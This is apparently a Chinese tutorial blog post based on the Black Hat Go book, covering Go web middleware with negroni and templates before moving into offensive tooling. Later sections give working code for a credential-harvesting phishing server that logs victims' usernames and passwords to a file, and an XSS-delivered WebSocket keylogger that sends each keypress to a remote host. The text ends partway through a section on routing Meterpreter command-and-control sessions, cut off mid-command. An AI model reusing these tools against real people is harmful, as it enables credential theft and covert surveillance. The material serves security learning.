使用<code>negroni</code>包构建中间件</h3><p>我们之前的中间件，记录了有关请求处理的开始和结束时间，并且返回了响应。再很多情况下，中间件其实不必对每个传入的请求都进行操作。使用中间件的原因由很多，其中包括记录请求，对用户身份验证和授权以及映射资源。</p><p>例如可以编写用于执行基本身份认证的中间件，它可以为每个请求解析一个授权标头，验证所提供的用户名和密码。如果凭证是无效的，则返回401响应。我们还可以将多个中间件函数链接再一起，从而能执行完一个中间件后执行下一个中间件。</p><p>此前创建的日志记录中间件仅包装类了一个函数，实际上，并没有什么作用。因为一般都是链式调用</p><p>接下来使用成熟的包<code>negroni</code></p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">go</span> get github.com/urfave/negroni</span><br></pre></td></tr></table></figure><p>然后进行一个简单的使用</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line"><span class="string">&quot;github.com/gorilla/mux&quot;</span></span><br><span class="line"><span class="string">&quot;github.com/urfave/negroni&quot;</span></span><br><span class="line"><span class="string">&quot;net/http&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">r := mux.NewRouter()</span><br><span class="line">n := negroni.Classic()</span><br><span class="line">n.UseHandler(r)</span><br><span class="line">http.ListenAndServe(<span class="string">&quot;:8000&quot;</span>,n)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>其中  <code>negroni.Classic()</code>创建了一个指向<code>Negroni</code>实例的新指针。</p><blockquote><p>要创建新指针由很多种方法</p><p>negroni.Classic()或者 negroni.New()</p><p>但是 negronic.Classic()使用默认的中间件，包括请求记录器，再默认的情况下拦截和恢复的中间件，以及服务于同一个目录的公共文件夹的中间件，函数<code>nehgroni.New()</code>不会创建任何默认的中间件</p><p>同时，<code>negroni.Use(NewRecovery())</code>可以用来使用恢复包</p></blockquote><p>接下来通过<code>n.UseHandler(r)</code>将路由器添加到中间件堆栈。在继续设计的时候，要考虑执行顺序。</p><p>例如：我们希望身份验证检查中间件需要在身份验证的处理函数之前运行。在路由器之前添加的任何中间件都将在处理函数运行前执行。路由之后添加的任何中间件都将在处理函数之后执行。</p><p><img src="https://cdn.jsdelivr.net/gh/h0ld1rs/image/image/20220302222010.png"></p><blockquote><p>发出 web请求后， negorni 将中间件信息打印到标准输出，</p></blockquote><p>默认的插件固然好用，但我们需要进行一个包装</p><p>首先输出一条消息，并将执行传递给下一个中间件</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">type</span> trival <span class="keyword">struct</span> &#123;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(t * trival)</span></span>ServeHTTP(w http.ResponseWriter,r * http.Request,next http.HandlerFunc) &#123;</span><br><span class="line">fmt.Println(<span class="string">&quot;Executing trival middleware&quot;</span>)</span><br><span class="line">next(w,r)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>我们重写了<code>ServeHTTP</code>的方法，加了一个 http.HandlerFunc 的参数，用来指向下一个中间件函数。</p><p>调用了 next 传递参数，实现在中间件链上的转移。</p><blockquote><p>个人感觉，这种方式有些类似于链表</p></blockquote><p>不过，需要告诉<code>negroni</code>包要将上述实现作为中间件链的部分，为此，可以调用<code>nergoni</code>的<code>Use</code>方法，并将接口<code>nergroni.Handler</code>实现的实例类传递给该方法。</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">n.Use(&amp;trival&#123;&#125;)</span><br></pre></td></tr></table></figure><p>虽然使用该方法编写中间件非常方便，但是，该方法也有一个弊端。无论编写什么方法都需要使用<code>negroni</code>包。</p><p>例如，我们正在写一个将安全标头写入响应的中间件包，希望它可以实现<code>Http.Handler</code>，这样就可以在其他应用程序中使用该接口，因为绝大多数程序栈似乎都不太欢迎接口<code>negroni.Handler</code></p><p>初次之外，还有两种方法让<code>negroni</code>包使用我们的中间件。其中一种就是<code>UseHadnler(handler http.Handler)</code></p><p>第二种方法是，调用<code>UseHandlerFunc(HandlerFunc func(w http.ResponseWriter,r * http.Request))</code></p><p>后者不太常用，因为它不允许放弃执行链中的下一个中间件。例如，一个中间件是用于执行身份验证的，如有无效凭证或者会话信息，则会返回401响应，并且停止运行。那么，第二种就完全不适合。</p><h3 id="6-使用negroni包添加身份认证"><a href="#6-使用negroni包添加身份认证" class="headerlink" title="6. 使用negroni包添加身份认证"></a>6. 使用negroni包添加身份认证</h3><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line"><span class="string">&quot;context&quot;</span></span><br><span class="line"><span class="string">&quot;fmt&quot;</span></span><br><span class="line"><span class="string">&quot;github.com/gorilla/mux&quot;</span></span><br><span class="line"><span class="string">&quot;github.com/urfave/negroni&quot;</span></span><br><span class="line"><span class="string">&quot;net/http&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="keyword">type</span> badAuth <span class="keyword">struct</span> &#123;</span><br><span class="line">Username <span class="type">string</span></span><br><span class="line">Password <span class="type">string</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(b *badAuth)</span></span>ServeHTTP(w http.ResponseWriter,r * http.Request,next http.HandlerFunc) &#123;</span><br><span class="line">username := r.URL.Query().Get(<span class="string">&quot;username&quot;</span>)</span><br><span class="line">password := r.URL.Query().Get(<span class="string">&quot;password&quot;</span>)</span><br><span class="line"><span class="keyword">if</span> username != b.Username || password != b.Password  &#123;</span><br><span class="line">http.Error(w,<span class="string">&quot;Unauthorized&quot;</span>,<span class="number">401</span>)</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line">ctx := context.WithValue(r.Context(),<span class="string">&quot;username&quot;</span>,username)</span><br><span class="line">r = r.WithContext(ctx)</span><br><span class="line">next(w,r)</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">hello</span><span class="params">(w http.ResponseWriter, r *http.Request)</span></span> &#123;</span><br><span class="line">username := r.Context().Value(<span class="string">&quot;username&quot;</span>).(<span class="type">string</span>)</span><br><span class="line">fmt.Fprintf(w, <span class="string">&quot;Hi %s\n&quot;</span>, username)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">r := mux.NewRouter()</span><br><span class="line">r.HandleFunc(<span class="string">&quot;/hello&quot;</span>,hello).Methods(<span class="string">&quot;GET&quot;</span>)</span><br><span class="line">n := negroni.Classic()</span><br><span class="line">n.Use(&amp;badAuth&#123;</span><br><span class="line">Username: <span class="string">&quot;admin&quot;</span>,</span><br><span class="line">Password: <span class="string">&quot;password&quot;</span>,</span><br><span class="line">&#125;)</span><br><span class="line">n.UseHandler(r)</span><br><span class="line">http.ListenAndServe(<span class="string">&quot;:8000&quot;</span>,n)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里加入了<code>badAuth</code>，该中间件将仅用于模拟身份验证。该中间件有两个字段，<code>Username</code>和<code>Password</code>，并且实现了接口<code>negroni.Handler</code>，因为它定义了包含三个参数的<code>ServeHTTP()</code>方法，在该方法中，首先获取用户名和密码，然后与我们拥有的字段进行比较，如果用户名密码不正确，将发送401状态码。</p><p>如果凭证正确，我们需要将用户名添加到请求上下文中。调用<code>context.WithValue()</code>从请求中初始化上下文，在该上下文中设置一个<code>username</code>的变量。然后，可以调用<code>r.WithContext(ctx)</code>来确保进行新的上下文。</p><p>在函数<code>hello()</code>中，可以使用函数<code>Context().Value(interface&#123;&#125;)</code>，从请求上下文中获取用户名，该函数本身返回一个<code>interface()</code>。因为他是一个字符串，所以可以直接使用断言。</p><h3 id="7-使用模板生成HTML响应"><a href="#7-使用模板生成HTML响应" class="headerlink" title="7. 使用模板生成HTML响应"></a>7. 使用模板生成HTML响应</h3><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line"><span class="string">&quot;html/template&quot;</span></span><br><span class="line"><span class="string">&quot;os&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> x = <span class="string">`</span></span><br><span class="line"><span class="string">&lt;html&gt;</span></span><br><span class="line"><span class="string">  &lt;body&gt;</span></span><br><span class="line"><span class="string">    Hello &#123;&#123;.&#125;&#125;</span></span><br><span class="line"><span class="string">  &lt;/body&gt;</span></span><br><span class="line"><span class="string">&lt;/html&gt;</span></span><br><span class="line"><span class="string">`</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">t, err := template.New(<span class="string">&quot;hello&quot;</span>).Parse(x)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="built_in">panic</span>(err)</span><br><span class="line">&#125;</span><br><span class="line">t.Execute(os.Stdout, <span class="string">&quot;&lt;script&gt;alert(&#x27;world&#x27;)&lt;/script&gt;&quot;</span>)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>定义一个<code>x</code>变量，储存模板，在模板内部，可以使用NaN 约定定义占位符，可以是一个结构体，也可以是一个基本数据类型。在这里，使用单个<code>.</code>，告诉程序包，要在此处，渲染整个上下文。，如果我们要将<code>Username</code>内容床欸模板，我们只需要，<code>&#123;&#123;.Username&#125;&#125;</code>渲染该字段。</p><p>接下来创建一个模板，然后进行解析，最后返回一个<code>Template</code>的指针。</p><blockquote><p>panic 可以用作处理错误</p></blockquote><p>最后使用<code>Execute(io.Writer,interface&#123;&#125;)</code>，然后将模板传递给第二个变量，，这里使用<code>os.Execute()</code>生成了HTML</p><h2 id="0X01凭证收割"><a href="#0X01凭证收割" class="headerlink" title="0X01凭证收割"></a>0X01凭证收割</h2><p>社会工程学的主要内容之一是：凭证收割攻击。这种类型的攻击通过诱使用户在原始网站的复制版本中输入凭证来捕获用户的登录信息。</p><p>拥有用户的凭证之后，就可以在他们实际的站点上进行登录，这通常是突破组织边界的入口。</p><p>我们首先需要<code>copy</code>一份网站源码，地址在这：</p><p><a href="https://github.com/blackhat-go/bhg/tree/master/ch-4/credential_harvester/public">https://github.com/blackhat-go/bhg/tree/master/ch-4/credential_harvester/public</a></p><p>将<code>index.html</code>中的这段内容，修改为如下</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">name</span>=<span class="string">&quot;form&quot;</span> <span class="attr">method</span>=<span class="string">&quot;post&quot;</span> <span class="attr">action</span>=<span class="string">&quot;http://127.0.0.1:8080/login&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure><p>然后我们开始使用 <code>python -m hpp.server</code> 开一个http服务</p><p><img src="https://cdn.jsdelivr.net/gh/h0ld1rs/image/image/20220303224017.png"></p><p>然后我们编写接受端的代码</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line"><span class="string">&quot;github.com/gorilla/mux&quot;</span></span><br><span class="line"><span class="string">&quot;net/http&quot;</span></span><br><span class="line"><span class="string">&quot;os&quot;</span></span><br><span class="line"><span class="string">&quot;time&quot;</span></span><br><span class="line">log <span class="string">&quot;github.com/sirupsen/logrus&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">login</span><span class="params">(w http.ResponseWriter, r *http.Request)</span></span> &#123;</span><br><span class="line">log.WithFields(log.Fields&#123;</span><br><span class="line"><span class="string">&quot;time&quot;</span>:       time.Now().String(),</span><br><span class="line"><span class="string">&quot;username&quot;</span>:   r.FormValue(<span class="string">&quot;_user&quot;</span>),</span><br><span class="line"><span class="string">&quot;password&quot;</span>:   r.FormValue(<span class="string">&quot;_pass&quot;</span>),</span><br><span class="line"><span class="string">&quot;user-agent&quot;</span>: r.UserAgent(),</span><br><span class="line"><span class="string">&quot;ip_address&quot;</span>: r.RemoteAddr,</span><br><span class="line">&#125;).Info(<span class="string">&quot;login attempt&quot;</span>)</span><br><span class="line">http.Redirect(w, r, <span class="string">&quot;/&quot;</span>, <span class="number">302</span>)</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">fh, err := os.OpenFile(<span class="string">&quot;credentials.txt&quot;</span>, os.O_CREATE|os.O_APPEND|os.O_WRONLY, <span class="number">0600</span>)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="built_in">panic</span>(err)</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">defer</span> fh.Close()</span><br><span class="line">log.SetOutput(fh)</span><br><span class="line">r := mux.NewRouter()</span><br><span class="line">r.HandleFunc(<span class="string">&quot;/login&quot;</span>, login).Methods(<span class="string">&quot;POST&quot;</span>)</span><br><span class="line">r.PathPrefix(<span class="string">&quot;/&quot;</span>).Handler(http.FileServer(http.Dir(<span class="string">&quot;public&quot;</span>)))<span class="comment">//提供静态文件</span></span><br><span class="line">log.Fatal(http.ListenAndServe(<span class="string">&quot;:8080&quot;</span>, r))</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里首先，我们需要导入包<code>github.com/Sirupsen/logrus</code>，这是我们希望使用结构化日志的记录包。</p><p>我们首先定义了函数<code>login</code>，使用<code>log.WithFields()</code>，写出捕获的数据。显示，时间，用户名和密码，用户代理和请求的IP地址。然后通过调用<code>FormValues(string)</code>来获取这些元素。需要与表单中存在的名字相对应。之后重定向到根目录。</p><p>在main函数中，0600 指的是创建新文件，创建文件之后，使用<code>log.SetOutput()</code>将句柄传递给他，以配置日志记录包并将其写入该文件。接下来，还需要告诉路由器从一个目录中提供静态文件。</p><p>开启的文件夹再以另一份形式放在代码的根目录下，之后当我们运行代码后，访问伪造的80端口，会将信息发储存在txt中，并且重定向到正确的8080端口</p><p><img src="https://cdn.jsdelivr.net/gh/h0ld1rs/image/image/20220303224108.png"></p><p><img src="https://cdn.jsdelivr.net/gh/h0ld1rs/image/image/20220303230309.png"></p><h2 id="0x02-使用-websocket-API实现按键记录"><a href="#0x02-使用-websocket-API实现按键记录" class="headerlink" title="0x02 使用 websocket API实现按键记录"></a>0x02 使用 websocket API实现按键记录</h2><p>近年来，全双工通信协议(websocket API)日益流行，许多浏览器开始支持他，他为web应用服务器和客户端之间的有效通信提供了一些方法。最重要的是，他允许服务器无需轮询就可以将消息发送到客户端</p><p>websocket对于构建诸如聊天游戏等实时应用程序比较有用。但我们也有其他用处，例如，将键盘记录程序注入，捕获用户按下的每个键。当我们可以进行xss攻击以后，我们可以包含一个<code>javascript</code>文件，以处理来自客户端<code>websocket</code>响应。</p><p>我们使用<code>JS Bin</code>(<a href="http://jsbin.com)来进行测试`payload`,代码如下/">http://jsbin.com)来进行测试`payload`，代码如下</a></p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;utf-8&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">&quot;viewport&quot;</span> <span class="attr">content</span>=<span class="string">&quot;width=device-width&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">title</span>&gt;</span>Test<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;http://127.0.0.1:8080/k.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">&#x27;/login&#x27;</span> <span class="attr">method</span>=<span class="string">&#x27;post&#x27;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">name</span>= <span class="string">&#x27;username&#x27;</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">name</span>= <span class="string">&#x27;password&#x27;</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&#x27;submit&#x27;</span>/&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p>当我们打开页面的时候，会提示创建了连接</p><p><img src="https://cdn.jsdelivr.net/gh/h0ld1rs/image/image/20220304114813.png"></p><p>如下：</p><p><img src="https://cdn.jsdelivr.net/gh/h0ld1rs/image/image/20220304114719.png"></p><p>当我们再打开的html页面键入的时候，会自动捕捉</p><p><img src="https://cdn.jsdelivr.net/gh/h0ld1rs/image/image/20220304114915.png"></p><p>先定义一个js模板，如下</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">(<span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">var</span> conn = <span class="keyword">new</span> <span class="title class_">WebSocket</span>(<span class="string">&quot;ws://&#123;&#123;.&#125;&#125;/ws&quot;</span>);</span><br><span class="line">    <span class="variable language_">document</span>.<span class="property">onkeypress</span> = keypress;</span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">keypress</span>(<span class="params">evt</span>) &#123;</span><br><span class="line">        s = <span class="title class_">String</span>.<span class="title function_">fromCharCode</span>(evt.<span class="property">which</span>);</span><br><span class="line">        conn.<span class="title function_">send</span>(s);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;)();</span><br></pre></td></tr></table></figure><p> 后端代码如下</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line"><span class="string">&quot;flag&quot;</span></span><br><span class="line"><span class="string">&quot;fmt&quot;</span></span><br><span class="line"><span class="string">&quot;html/template&quot;</span></span><br><span class="line"><span class="string">&quot;log&quot;</span></span><br><span class="line"><span class="string">&quot;net/http&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="string">&quot;github.com/gorilla/mux&quot;</span></span><br><span class="line"><span class="string">&quot;github.com/gorilla/websocket&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> (</span><br><span class="line">upgrader = websocket.Upgrader&#123;</span><br><span class="line">CheckOrigin: <span class="function"><span class="keyword">func</span><span class="params">(r *http.Request)</span></span> <span class="type">bool</span> &#123; <span class="keyword">return</span> <span class="literal">true</span> &#125;,</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">listenAddr <span class="type">string</span></span><br><span class="line">wsAddr     <span class="type">string</span></span><br><span class="line">jsTemplate *template.Template</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">init</span><span class="params">()</span></span> &#123;</span><br><span class="line">flag.StringVar(&amp;listenAddr, <span class="string">&quot;listen-addr&quot;</span>, <span class="string">&quot;&quot;</span>, <span class="string">&quot;Address to listen on&quot;</span>)</span><br><span class="line">flag.StringVar(&amp;wsAddr, <span class="string">&quot;ws-addr&quot;</span>, <span class="string">&quot;&quot;</span>, <span class="string">&quot;Address for WebSocket connection&quot;</span>)</span><br><span class="line">flag.Parse()</span><br><span class="line"><span class="keyword">var</span> err <span class="type">error</span></span><br><span class="line">jsTemplate, err = template.ParseFiles(<span class="string">&quot;logger.js&quot;</span>)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="built_in">panic</span>(err)</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">serveWS</span><span class="params">(w http.ResponseWriter, r *http.Request)</span></span> &#123;</span><br><span class="line">conn, err := upgrader.Upgrade(w, r, <span class="literal">nil</span>)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">http.Error(w, <span class="string">&quot;&quot;</span>, <span class="number">500</span>)</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">defer</span> conn.Close()</span><br><span class="line">fmt.Printf(<span class="string">&quot;Connection from %s\n&quot;</span>, conn.RemoteAddr().String())</span><br><span class="line"><span class="keyword">for</span> &#123;</span><br><span class="line">_, msg, err := conn.ReadMessage()</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line">fmt.Printf(<span class="string">&quot;From %s: %s\n&quot;</span>, conn.RemoteAddr().String(), <span class="type">string</span>(msg))</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">serveFile</span><span class="params">(w http.ResponseWriter, r *http.Request)</span></span> &#123;</span><br><span class="line">w.Header().Set(<span class="string">&quot;Content-Type&quot;</span>, <span class="string">&quot;application/javascript&quot;</span>)</span><br><span class="line">jsTemplate.Execute(w, wsAddr)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">r := mux.NewRouter()</span><br><span class="line">r.HandleFunc(<span class="string">&quot;/ws&quot;</span>, serveWS)</span><br><span class="line">r.HandleFunc(<span class="string">&quot;/k.js&quot;</span>, serveFile)</span><br><span class="line">log.Fatal(http.ListenAndServe(<span class="string">&quot;:8080&quot;</span>, r))</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里需要先下载<code>github.com/gorilla/websocket</code>的包</p><p>首先，定义一个<code>websocket.Upgrader</code>，该实例会将每个来源列入白名单，允许所有来源的做法是不安全的，但是，这里，我们选择继续使用，当作测试用例。之后再定义监听地址和 ws地址。以及定义<code>js</code>所使用的模板地址</p><p>然后创建<code>init函数</code>，再main函数之前，自动调用</p><blockquote><p>flag包用来设置参数和解析值：地址，参数，默认值和备注</p><p>然后使用Parse()进行解析</p></blockquote><p>接下来定义了一个 <code>ServeWS</code>的函数，用来处理<code>websocket</code>通信，通过<code>upgrader.Upgrade</code>方法，创建新的<code>websocket,Conn</code>实例。方法<code>Upgrade()</code>升级了HTTP连接以使用<code>websocket</code>协议。这将意味着此函数处理任何请求都将升级为使用<code>websocket</code>，再无限的for循环中进行交互，调用<code>conn.ReadMessage()</code>读取信息，</p><p>然后我们创建一个<code>serveFile()</code>的处理函数，此函数将检索并且返回<code>javascript</code>的模板内容，其中包括上下文数据，为此，我们需要将<code>Content-Type</code>标头，设置为<code>application/javascript</code>，这就告诉连接正文，将与浏览器之间的响应内容视为<code>javascript</code>，</p><p>之后设置解析我们传入的<code>wsAddr</code></p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">jsTemplate.Execute(w, wsAddr)</span><br></pre></td></tr></table></figure><p>最后我们只要创建路由就可以了。</p><h2 id="0x03-多路命令和控制"><a href="#0x03-多路命令和控制" class="headerlink" title="0x03 多路命令和控制"></a>0x03 多路命令和控制</h2><p>在本节中，我们需要学会 go 创建反向<code>http</code>代理，以便可以基于<code>Host HTTP</code>标头动态路由中传入的<code>Meterpreter</code>会话，这正是虚拟网站托管的方式。</p><p>首先，代理会充当重定向器，允许你仅公开域名和<code>IP</code>地址，而无需公开<code>metasploit</code>监听器，如果重定向器曾被列为黑名单，你可以直接移除他，而不是移除<code>C2</code>服务器。其次，你可以扩展这里的概念来进行域前置，他是利用可信第三方域绕过限制性出口的技术。</p><p>首先，我们需要设置单独的<code>MeterPreter</code>反向HTTP监听器</p><p>大致如下</p><blockquote><p>msf6 &gt; use exploit&#x2F;multi&#x2F;handler<br>[*] Using configured payload generic&#x2F;shell_reverse_tcp<br>msf6 exploit(multi&#x2F;handler) &gt; set payload windows&#x2F;meterpreter_reverse_http<br>payload &#x3D;&gt; 